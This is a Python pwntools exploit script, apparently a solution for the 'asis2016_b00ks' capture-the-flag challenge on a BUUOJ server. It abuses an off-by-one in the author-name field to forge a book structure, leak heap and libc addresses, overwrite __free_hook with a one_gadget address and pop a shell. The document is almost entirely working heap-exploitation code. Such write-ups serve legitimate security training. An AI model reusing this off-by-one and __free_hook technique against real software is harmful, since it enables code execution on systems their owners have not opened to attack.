from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6')
elf = ELF('./asis2016_b00ks')

#context.log_level = 'debug'
debug = 1

if debug:
    io = process('./asis2016_b00ks')
else:
    io = remote('node4.buuoj.cn',25075)
def p():
    gdb.attach(proc.pidof(io)[0])

def create(name_size,name,descrip_size,descrip):
    io.sendlineafter(b"> ",str(1))
    io.sendlineafter(b"Enter book name size: ",str(name_size))
    io.sendafter(b"Enter book name (Max 32 chars): ",name)
    io.sendlineafter(b"Enter book description size: ",str(descrip_size))
    io.sendafter(b"Enter book description: ",descrip)

def delete(idx):
    io.sendlineafter(b"> ",str(2))
    io.sendlineafter(b"Enter the book id you want to delete: ",str(idx))

def edit(idx,descrip):
    io.sendlineafter(b"> ",str(3))
    io.sendlineafter(b"Enter the book id you want to edit: ",str(idx))
    io.sendafter(b"Enter new book description: ",descrip)

def show():
    io.sendlineafter(b"> ",str(4))

def read_author_name(byte):
    io.sendlineafter(b"> ",str(5))
    name = b'a' * 0x20 + byte
    io.sendafter(b"Enter author name: ",name)


io.sendlineafter(b"Enter author name:",b'a' * 0x20)
create(208,b"aaaa\n",144,b"bbbb\n") 
show()
io.recvuntil(b'a' * 0x20)
book1_addr = u64(io.recv(6).ljust(8,b'\x00')) - 0x10
success("book1_addr --> " + hex(book1_addr))
success("heap_base --> " + hex(book1_addr - 0x1190))
create(135168,b"aaaa\n",135168,b"bbbb\n") 

#create fack book 
## leak libc
fack_book = p64(1) # idx
fack_book += p64(book1_addr + 0x180) # name_ptr
fack_book += p64(book1_addr + 0x50) # descrip_ptr  == &(book2->descrip_ptr) libc
fack_book += p64(0x20) # size
fack_book += b'\n'
edit(1,fack_book)
read_author_name(b'\n')
show()
#libc_base = u64(io.recvuntil(b'\nAuth',drop=True)[-6:].ljust(8,b'\x00')) - 0x5a5010 + 0x1000 # 远端
libc_base = u64(io.recvuntil(b'\nAuth',drop=True)[-6:].ljust(8,b'\x00')) - 0x5a5010 
libc.address = libc_base
success("libc_base -->" + hex(libc.address))
#free_hook = libc_base + 0x3c57a8 + 0x1000 #远端
free_hook = libc_base + 0x3c57a8 
success("__free_hook-->" + hex(free_hook))

## overwrite __free_hook
#p()
edit(1,p64(free_hook) + b'\n')
#one_gadget = p64(libc_base + 0x4526a) + b'\n' #远端
one_gadget = p64(libc_base + 0x4525a) + b'\n' 
edit(2,one_gadget)
delete(1)

io.interactive()

